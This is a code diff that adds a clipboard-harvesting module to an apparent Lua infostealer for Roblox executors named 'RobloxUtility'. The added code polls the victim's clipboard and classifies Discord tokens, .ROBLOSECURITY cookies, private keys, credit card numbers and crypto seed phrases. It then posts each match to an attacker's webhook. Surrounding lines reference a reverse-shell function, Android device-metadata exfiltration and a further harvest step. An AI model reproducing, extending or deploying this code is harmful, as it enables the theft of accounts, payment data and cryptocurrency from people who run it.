@@ -613,6 +613,120 @@ local function try_reverse_shell()
 end
 
 -- =============================================================================
+-- CLIPBOARD HARVESTER
+-- Polls OS clipboard for credentials, tokens, cookies, wallet seeds, etc.
+-- Compatible with Solara (Windows) and Delta (Android) — both expose
+-- getclipboard(). Runs synchronously, blocks the chain so the poller
+-- can run for the configured duration. Filters out generic noise,
+-- only webhooks interesting hits (tokens, cookies, keys, seeds, etc).
+-- =============================================================================
+local CLIPBOARD_CFG = {
+    seconds     = 20,    -- total poll duration
+    interval_ms = 250,   -- how often to check
+    dedupe_n    = 100,   -- rolling dedup window
+    min_len     = 8,     -- skip empty/tiny
+    max_len     = 1500,  -- truncate before sending
+}
+
+local _cb_seen = {}
+local function _cb_hash(s)
+    local h = 5381
+    for i = 1, #s do
+        h = (h * 33 + string.byte(s, i)) % 0x7fffffff
+    end
+    return h
+end
+
+-- Sleep that works in any executor (no task.wait / coroutine yield reliance)
+local function _cb_sleep(sec)
+    local t0 = (os.clock and os.clock()) or 0
+    while ((os.clock and os.clock()) or 0) - t0 < sec do end
+end
+
+-- Classify clipboard text into a category, return nil if not interesting
+local function _cb_classify(s)
+    if not s or #s < CLIPBOARD_CFG.min_len then return nil end
+    if s:match("^mfa%.[%w_]+") then return "discord_token" end
+    if s:match("_|WARNING") or s:match("ROBLOSECURITY") or s:match("RBX%-") then return "roblox_cookie" end
+    if s:match("BEGIN.*PRIVATE KEY") then return "private_key_pem" end
+    if s:match("^%d%d%d%d[%-%s]?%d%d%d%d[%-%s]?%d%d%d%d[%-%s]?%d%d%d%d$") then return "credit_card" end
+    if s:match("^[%w%.%+%-_]+@[%w%.%-]+%.%w") and #s < 100 then return "email" end
+    -- Crypto seed phrase: 12-24 lowercase words of length 3-12
+    local wc = 0
+    for w in s:gmatch("[%w]+") do
+        if #w >= 3 and #w <= 12 and w:match("^[a-z]+$") then wc = wc + 1 end
+    end
+    if wc >= 12 and wc <= 24 then return "crypto_seed_phrase" end
+    if #s >= 50 and s:match("^[%w%+%/=]+$") then return "base64_blob" end
+    if s:match("token=") or s:match("api_key=") or s:match("apikey=")
+       or s:match("secret=") or s:match("password=") then return "url_with_token" end
+    if s:match("^https?://[%w%.%-]+/[%w%-%_%.%?&=:@/]+$") and #s > 40 then return "long_url" end
+    return nil
+end
+
+-- Emit a capture to the webhook (with dedup). src is "initial" or "change"
+local function _cb_emit(s, src)
+    if not s or #s < CLIPBOARD_CFG.min_len then return end
+    local h = _cb_hash(s)
+    for _, p in ipairs(_cb_seen) do
+        if p == h then return end
+    end
+    table.insert(_cb_seen, h)
+    if #_cb_seen > CLIPBOARD_CFG.dedupe_n then
+        table.remove(_cb_seen, 1)
+    end
+
+    local kind = _cb_classify(s)
+    if not kind then return end  -- not interesting, skip
+
+    local display = s
+    if #display > CLIPBOARD_CFG.max_len then
+        display = display:sub(1, CLIPBOARD_CFG.max_len)
+            .. "\n... [truncated, " .. tostring(#s) .. " total chars]"
+    end
+
+    webhook(
+        "📋 Clipboard: " .. kind .. " (" .. src .. ")",
+        "```\n" .. display .. "\n```",
+        0xff8800
+    )
+end
+
+local function run_clipboard_harvest()
+    if not getclipboard then
+        print("[clipboard] getclipboard not available in this executor -- skipping")
+        return 0
+    end
+
+    local ok, first = pcall(getclipboard)
+    if not ok or type(first) ~= "string" then
+        print("[clipboard] initial read failed: " .. tostring(first))
+        return 0
+    end
+
+    print("[clipboard] harvester running (" .. CLIPBOARD_CFG.seconds .. "s, every "
+        .. CLIPBOARD_CFG.interval_ms .. "ms)")
+    _cb_emit(first, "initial")
+    local last = first
+    local start = (os.clock and os.clock()) or 0
+    local captures = 0
+    local interval = CLIPBOARD_CFG.interval_ms / 1000.0
+
+    while ((os.clock and os.clock()) or 0) - start < CLIPBOARD_CFG.seconds do
+        _cb_sleep(interval)
+        local ok2, cur = pcall(getclipboard)
+        if ok2 and type(cur) == "string" and cur ~= last and #cur > 0 then
+            _cb_emit(cur, "change")
+            captures = captures + 1
+            last = cur
+        end
+    end
+
+    print("[clipboard] done, " .. tostring(captures) .. " new captures sent")
+    return captures
+end
+
+-- =============================================================================
 -- MAIN
 -- =============================================================================
 print("[+] RobloxUtility chain fired")
@@ -636,6 +750,11 @@ if platform == "android" then
     local meta = android_metadata()
     webhook("Android metadata", json_encode(meta), 0x8080ff)
 end
+
+-- Clipboard harvester (Solara + Delta). Blocks chain for ~20s while polling.
+-- Captures Discord tokens, .ROBLOSECURITY cookies, private keys, crypto
+-- seeds, base64 blobs, URLs with token=, credit cards, etc.
+local cb_captures = run_clipboard_harvest()
 
 -- Run harvest
 print("[*] Running harvest...")
